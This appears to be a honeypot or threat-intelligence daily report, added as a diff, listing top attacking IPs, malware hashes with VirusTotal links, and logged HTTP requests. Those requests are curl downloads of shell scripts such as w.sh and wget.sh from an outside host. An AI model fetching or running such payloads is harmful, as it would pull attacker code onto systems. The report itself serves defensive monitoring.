@@ -1,0 +1,77 @@
+Top 5 IPs for 23-09-2024 :
+
+168.167.72.228
+46.167.159.127
+14.215.120.90
+183.81.169.238
+149.50.106.170	
+
+
+Malware Observed:
+
+e9b16c8bced0456b74b29b14cd9daf6d97a66e7ee31972941547a4f2e52cbc42
+https://www.virustotal.com/gui/file/e9b16c8bced0456b74b29b14cd9daf6d97a66e7ee31972941547a4f2e52cbc42
+
+73b320b1604b9b70f9e7d5f8b16c195c3ffffead63c345db29609c1d1f7e13f1
+https://www.virustotal.com/gui/file/73b320b1604b9b70f9e7d5f8b16c195c3ffffead63c345db29609c1d1f7e13f1
+
+922fdfa86b974b97ef28b75a6ed6984854c210b69cd87c26812fc42627c474f8
+https://www.virustotal.com/gui/file/922fdfa86b974b97ef28b75a6ed6984854c210b69cd87c26812fc42627c474f8
+
+
+Commands/exploits observed :
+
+GET /w.sh HTTP/1.1
+Host: 51.79.157.172
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /c.sh HTTP/1.1
+Host: 51.79.157.172
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 51.79.157.172
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 51.79.157.172
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 51.79.157.172
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 51.79.157.172
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+
+
+
+
+
+
+
+
+
+
+
